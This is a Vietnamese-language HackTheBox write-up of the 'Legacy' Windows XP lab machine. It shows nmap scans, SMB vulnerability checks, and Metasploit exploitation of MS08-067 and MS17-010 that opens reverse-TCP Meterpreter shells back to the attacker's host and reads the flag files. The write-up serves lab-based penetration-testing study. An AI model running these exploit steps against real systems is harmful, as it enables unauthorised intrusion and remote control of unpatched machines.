---
pubDatetime: 2026-09-13T23:00:00Z
title: HackTheBox - Legacy
slug: "hackethebox-machine-legacy"
featured: false
tags:
  - hackthebox
  - machine
  - metasploit
  - smb
  - cve-2008-4250
  - cve-2017-0143
description: "Writeup of the machine in HackTheBox"
---
## Description
![alt text](image.png)
Legacy là một máy Windows (Easy) trên HackTheBox, phù hợp cho người mới bắt đầu làm quen với khai thác lỗ hổng SMB. Máy chỉ mở 3 port TCP chính là 135, 139 và 445, tất cả đều liên quan đến dịch vụ SMB của Windows. Qua việc quét vulnerability bằng nmap, phát hiện máy dính đồng thời hai lỗ hổng nghiêm trọng là **MS08-067 (CVE-2008-4250)** và **MS17-010 (CVE-2017-0143)**. Cả hai đều có thể khai thác dễ dàng để đạt được quyền **NT AUTHORITY\SYSTEM**.
## Enumeration
### Nmap

```bash
```bash
$cat alltcp.nmap 
# Nmap 7.95 scan initiated Sun Sep 13 20:10:22 2026 as: nmap -sT -p- --min-rate 1000 -oA nmap/alltcp 10.129.227.181
Nmap scan report for 10.129.227.181
Host is up (0.077s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

# Nmap done at Sun Sep 13 20:11:32 2026 -- 1 IP address (1 host up) scanned in 70.05 seconds
$cat alludp.nmap 
# Nmap 7.95 scan initiated Sun Sep 13 20:11:01 2026 as: nmap -sU -p- --min-rate 1000 -oA nmap/alludp 10.129.227.181
Nmap scan report for 10.129.227.181
Host is up (0.083s latency).
Not shown: 65527 closed udp ports (port-unreach)
PORT     STATE         SERVICE
123/udp  open          ntp
137/udp  open          netbios-ns
138/udp  open|filtered netbios-dgm
445/udp  open|filtered microsoft-ds
500/udp  open|filtered isakmp
1025/udp open|filtered blackjack
1900/udp open|filtered upnp
4500/udp open|filtered nat-t-ike

# Nmap done at Sun Sep 13 20:12:12 2026 -- 1 IP address (1 host up) scanned in 70.19 seconds
$nmap -sC -sV -p 135,139,445 -oA nmap/detailedtcp 10.129.227.181
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-13 20:19 +07
Nmap scan report for 10.129.227.181
Host is up (0.075s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2026-09-18T18:16:17+03:00
|_clock-skew: mean: 5d00h26m49s, deviation: 2h07m16s, median: 4d22h56m49s
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:41:b2 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.38 seconds
```

## Attacks on SMB 

### SMB Enumeration

Không có kết quả gì khi sử dụng smbmap và smbclient.

```bash
$smbmap -H 10.129.227.181

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                                  [|] Checking for open ports...                                                  [*] Detected 1 hosts serving SMB                  
[/] Initializing hosts...                                                       [-] Authenticating...                                                           [\] Authenticating...                                                           [|] Authenticating...                                                           [/] Authenticating...                                                           [-] Authenticating...                                                           [\] Authenticating...                                                           [|] Authenticating...                                                           [/] Authenticating...                                                           [*] Established 1 SMB connections(s) and 1 authenticated session(s)
[-] Enumerating shares...                                                       [\] Enumerating shares...                                                       [|] Enumerating shares...                                                       [!] Access denied on 10.129.227.181, no fun for you...
[/] Closing connections..                                                       [-] Closing connections..   
$smbclient -N -L //10.129.227.181
session setup failed: NT_STATUS_INVALID_PARAMETER
```

Mình biết được việc quét vuln bằng nmap thông qua idol 0xdf.

```bash
#ls /usr/share/nmap/scripts | grep smb | grep vuln
smb2-vuln-uptime.nse
smb-vuln-conficker.nse
smb-vuln-cve2009-3103.nse
smb-vuln-cve-2017-7494.nse
smb-vuln-ms06-025.nse
smb-vuln-ms07-029.nse
smb-vuln-ms08-067.nse
smb-vuln-ms10-054.nse
smb-vuln-ms10-061.nse
smb-vuln-ms17-010.nse
smb-vuln-regsvc-dos.nse
smb-vuln-webexec.nse

#nmap --script smb-vuln* -p 445 -oA nmap/smb_vulns 10.129.227.181
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-13 20:31 +07
Nmap scan report for 10.129.227.181
Host is up (0.077s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 5.49 seconds
```

### CVE-2008-4250

Mình sử dụng MetaSploit để khai thác. 

```bash
$msfconsole
Metasploit tip: Use the edit command to open the currently active module 
in your editor
                                                  
     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v6.4.136-dev                               ]
+ -- --=[ 2,656 exploits - 1,338 auxiliary - 2,141 payloads     ]
+ -- --=[ 434 post - 49 encoders - 14 nops - 12 evasion         ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

[msf](Jobs:0 Agents:0) >> search CVE-2008-4250

Matching Modules
================

   #   Name                                                             Disclosure Date  Rank   Check  Description
   -   ----                                                             ---------------  ----   -----  -----------
   0   exploit/windows/smb/ms08_067_netapi                              2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> 
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> set RHOST 10.129.25.128
RHOST => 10.129.25.128
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> set LHOST tun0
LHOST => 10.10.14.30
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> exploit
[*] Started reverse TCP handler on 10.10.14.30:4444 
[*] 10.129.25.128:445 - Automatically detecting the target...
[*] 10.129.25.128:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.129.25.128:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.129.25.128:445 - Attempting to trigger the vulnerability...
[*] Sending stage (177734 bytes) to 10.129.25.128
[*] Meterpreter session 1 opened (10.10.14.30:4444 -> 10.129.25.128:1038) at 2026-09-13 22:21:20 +0200

(Meterpreter 1)(C:\windows) > 
(Meterpreter 1)(C:\Documents and Settings\john\Desktop) > cat user.txt
(Meterpreter 1)(C:\Documents and Settings\Administrator\Desktop) > cat root.txt
```

### CVE-2017-0143

Mình cũng sử dụng Metasploit để khai thác.

```bash
$msfconsole
Metasploit tip: Tired of setting RHOSTS for modules? Try globally 
setting it with setg RHOSTS x.x.x.x
                                                  
                          ########                  #
                      #################            #
                   ######################         #
                  #########################      #
                ############################
               ##############################
               ###############################
              ###############################
              ##############################
                              #    ########   #
                 ##        ###        ####   ##
                                      ###   ###
                                    ####   ###
               ####          ##########   ####
               #######################   ####
                 ####################   ####
                  ##################  ####
                    ############      ##
                       ########        ###
                      #########        #####
                    ############      ######
                   ########      #########
                     #####       ########
                       ###       #########
                      ######    ############
                     #######################
                     #   #   ###  #   #   ##
                     ########################
                      ##     ##   ##     ##
                            https://metasploit.com


       =[ metasploit v6.4.136-dev                               ]
+ -- --=[ 2,656 exploits - 1,338 auxiliary - 2,141 payloads     ]
+ -- --=[ 434 post - 49 encoders - 14 nops - 12 evasion         ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

[msf](Jobs:0 Agents:0) >> search CVE-2017-0143

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
...
[msf](Jobs:0 Agents:0) >> use 10
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set RHOST 10.129.9.215
RHOST => 10.129.9.215
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set LHOST tun0
LHOST => 10.10.14.30
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> exploit
[*] Started reverse TCP handler on 10.10.14.30:4444 
[*] 10.129.9.215:445 - Target OS: Windows 5.1
[*] 10.129.9.215:445 - Filling barrel with fish... done
[*] 10.129.9.215:445 - <---------------- | Entering Danger Zone | ---------------->
[*] 10.129.9.215:445 - 	[*] Preparing dynamite...
[*] 10.129.9.215:445 - 		[*] Trying stick 1 (x86)...Boom!
[*] 10.129.9.215:445 - 	[+] Successfully Leaked Transaction!
[*] 10.129.9.215:445 - 	[+] Successfully caught Fish-in-a-barrel
[*] 10.129.9.215:445 - <---------------- | Leaving Danger Zone | ---------------->
[*] 10.129.9.215:445 - Reading from CONNECTION struct at: 0x85fe5da8
[*] 10.129.9.215:445 - Built a write-what-where primitive...
[+] 10.129.9.215:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.9.215:445 - Selecting native target
[*] 10.129.9.215:445 - Uploading payload... efnNGToV.exe
[*] 10.129.9.215:445 - Created \efnNGToV.exe...
[+] 10.129.9.215:445 - Service started successfully...
[*] Sending stage (199238 bytes) to 10.129.9.215
[*] 10.129.9.215:445 - Deleting \efnNGToV.exe...
[*] Meterpreter session 1 opened (10.10.14.30:4444 -> 10.129.9.215:1032) at 2026-09-13 22:32:40 +0700

(Meterpreter 1)(C:\WINDOWS\system32) > 
```
![alt text](image-1.png)